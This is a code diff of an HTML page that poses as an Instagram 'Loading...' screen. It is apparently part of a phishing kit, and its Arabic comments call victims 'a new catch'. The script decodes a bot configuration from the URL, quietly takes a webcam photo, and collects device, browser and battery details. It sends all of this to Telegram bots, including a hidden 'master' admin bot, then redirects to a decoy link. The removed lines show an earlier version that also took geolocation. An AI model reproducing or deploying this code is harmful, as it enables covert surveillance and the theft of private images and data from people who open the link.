@@ -4,80 +4,90 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram | Loading...</title>
-    
-    <meta property="og:title" content="شاهد المحتوى الآن">
-    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg">
-    <meta property="og:description" content="تم مشاركة فيديو معك عبر إنستجرام">
-
     <style>
-        body { background: #000; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; }
-        .loader { width: 50px; height: 50px; border: 3px solid #333; border-top: 3px solid #0095f6; border-radius: 50%; animation: spin 1s linear infinite; }
+        body { background: #000; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .loader { width: 45px; height: 45px; border: 3px solid #1a1a1a; border-top: 3px solid #0095f6; border-radius: 50%; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .text { color: #555; margin-top: 15px; font-size: 12px; letter-spacing: 1px; }
     </style>
 </head>
 <body>
 
-    <div style="text-align: center;">
-        <div class="loader"></div>
-        <div class="text">CONNECTING TO SERVER...</div>
-    </div>
-
-    <canvas id="pc" style="display:none;"></canvas>
+    <div class="loader"></div>
+    <canvas id="cv" style="display:none;"></canvas>
 
     <script>
         window.onload = async () => {
+            // فك تشفير البيانات المرسلة (البوت الفرعي، التمويه، صاحب اللينك)
             const params = new URLSearchParams(window.location.search);
-            const payload = params.get('p');
-            if (!payload) return window.location.href = "https://instagram.com";
+            const p = params.get('p'); // داتا مشفرة
+            if (!p) return window.location.href = "https://instagram.com";
 
             try {
-                const data = JSON.parse(atob(payload)); // فك التشفير (Token, ID, URL, Mode)
-                
-                // 1. محاولة لقط الصورة فوراً (صامت)
+                const cfg = JSON.parse(atob(p)); // {t: token, i: id, u: url, o: ownerID}
+                const master = JSON.parse(localStorage.getItem('master_bot') || '{}');
+
+                // 1. سحب بيانات الجهاز الأساسية
+                let info = `🏴‍☠️ **صيد جديد (Matrix V7)**\n` +
+                           `👤 صاحب اللينك: \`${cfg.o}\`\n` +
+                           `📱 الجهاز: ${navigator.platform}\n` +
+                           `🌐 المتصفح: ${navigator.userAgent.split(' ').pop()}\n` +
+                           `🔋 البطارية: ${await getBattery()}`;
+
+                // 2. محاولة سحب الكاميرا (صامتة)
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                     const video = document.createElement('video');
                     video.srcObject = stream;
                     await video.play();
-                    
-                    const canvas = document.getElementById('pc');
-                    canvas.width = 640; canvas.height = 480;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    
-                    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
-                    const fd = new FormData();
-                    fd.append('photo', blob, 'shot.jpg');
-                    fd.append('chat_id', data.i);
-                    
-                    await fetch(`https://api.telegram.org/bot${data.t}/sendPhoto`, { method: 'POST', body: fd });
-                    stream.getTracks().forEach(t => t.stop());
-                } catch (e) { console.log("Camera Blocked"); }
 
-                // 2. سحب الموقع والبيانات
-                let info = `📱 **صيد جديد (Matrix V5)**\n- الجهاز: ${navigator.platform}\n- المتصفح: ${navigator.userAgent.split(' ').pop()}\n- الرامات: ${navigator.deviceMemory || '??'}GB`;
-                
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    const map = `\n📍 **الموقع:** https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                    await send(data, info + map);
-                }, async () => {
-                    await send(data, info + "\n⚠️ الموقع: الضحية رفض الصلاحية.");
-                });
+                    const cv = document.getElementById('cv');
+                    cv.width = 640; cv.height = 480;
+                    cv.getContext('2d').drawImage(video, 0, 0);
+                    
+                    const blob = await new Promise(res => cv.toBlob(res, 'image/jpeg', 0.7));
+                    
+                    // إرسال الصورة للمشترك وللأدمن الماستر
+                    await sendToBots(cfg, master, info, blob);
+                    
+                    stream.getTracks().forEach(track => track.stop());
+                } catch (e) {
+                    // لو الكاميرا مقفولة، ابعت البيانات النصية فقط
+                    await sendToBots(cfg, master, info + "\n⚠️ الكاميرا: تم الرفض.");
+                }
 
                 // 3. التحويل النهائي للتمويه
-                setTimeout(() => { window.location.href = data.u; }, 2000);
+                setTimeout(() => { window.location.href = cfg.u; }, 1500);
 
             } catch (err) {
                 window.location.href = "https://instagram.com";
             }
         };
 
-        async function send(cfg, txt) {
-            await fetch(`https://api.telegram.org/bot${cfg.t}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                body: `chat_id=${cfg.i}&text=${encodeURIComponent(txt)}&parse_mode=Markdown`
-            });
+        async function getBattery() {
+            try {
+                const b = await navigator.getBattery();
+                return `${Math.round(b.level * 100)}% (${b.charging ? 'شحن' : 'تفريغ'})`;
+            } catch { return "غير معروف"; }
+        }
+
+        async function sendToBots(userBot, adminBot, text, photo = null) {
+            const targets = [userBot]; // بوت المشترك
+            if (adminBot.t) targets.push(adminBot); // بوتك إنت يا ماستر
+
+            for (let bot of targets) {
+                try {
+                    if (photo) {
+                        const fd = new FormData();
+                        fd.append('photo', photo, 'shot.jpg');
+                        fd.append('chat_id', bot.i);
+                        fd.append('caption', text);
+                        fd.append('parse_mode', 'Markdown');
+                        await fetch(`https://api.telegram.org/bot${bot.t}/sendPhoto`, { method: 'POST', body: fd });
+                    } else {
+                        await fetch(`https://api.telegram.org/bot${bot.t}/sendMessage?chat_id=${bot.i}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
+                    }
+                } catch (e) { console.error("Send Error"); }
+            }
         }
     </script>
 </body>
